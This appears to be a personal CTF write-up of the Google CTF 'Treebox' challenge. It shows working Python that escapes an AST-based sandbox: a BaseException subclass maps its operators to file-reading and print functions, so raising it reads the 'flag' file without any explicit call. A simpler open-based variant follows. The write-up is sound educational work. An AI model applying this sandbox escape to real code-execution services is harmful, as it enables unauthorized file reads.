---
title: "Treebox"
date: 2022-08-19T10:04:36+05:30
tags:
- Google CTF
- CTF
- Python
- AST
- Sandbox Escape
draft: false
---

This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren't any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at `flag`. We also can't import any modules explicitly. If we read the source code provided for the challenge, we can observe that the `sys` module is already imported. We can piggyback on this fact to use its modules.

We shall, however, first find all the modules in `sys.modules` that have a `get_data` like function in their `__loader__` attribute. To do so, we run the following locally:

``` python
import sys

for name, handle in sys.modules.items():
    if loader := getattr(handle, '__loader__'):
        for loader_function_name in dir(loader):
            if 'get_data' in loader_function_name:
                print(f"sys.modules['{name}'].__loader__.{loader_function_name}")
```

There are a lot of modules that have the `get_data`  From the output we get, this looks the most promising:

```python
sys.modules["code"].__loader__.get_data
```

Now we can slowly assemble our exploit.

{{< collapsable-explanation >}}

```python
import sys
```

We create a class called `Read` that inherits from the `BaseException` class.

```python
class Read(BaseException):
```
We define the members of the class as the following:

Set the addition operator to the `str` function to stringify bytes-like
objects.

```python
    __add__ = str
```

Set the division operator to os.loader.get_data method
which can be used to read the raw bytes from a file.
```python
    __truediv__ = sys.modules["code"].__loader__.get_data
```

Set the indexing operator to print, which we'll use to print the flag

```python
    __getitem__ = print
```

Now we need to detonate these operators without calling a function.
The best way is to define an `__init__` constructor method that is called implicitly when the
class is created.

Through this, we read the raw bytes of the file "flag" stringify it and finally print it.

```python
    def __init__(self):
        self[self + self / "flag"]
```

With all of that setup out of the way, we can instantiate the class by raising it as an exception.

```python
raise Read
```

```python
import sys
class Read(BaseException):
    __add__ = str
    __truediv__ = sys.modules["code"].__loader__.get_data
    __getitem__ = print
    def __init__(self):
        self[self + self / "flag"]

raise Read
```

{{< / collapsable-explanation >}}

### Update: 2025-09-15

I was lurking through my past writeups, here's an ever easier way to achieve the same file read
without importing the `sys` module.

```python
class Read(BaseException):
    __add__ = list
    __truediv__ = open
    __getitem__ = print
    def __init__(self):
        self[self + self / "flag"]

raise Read
```
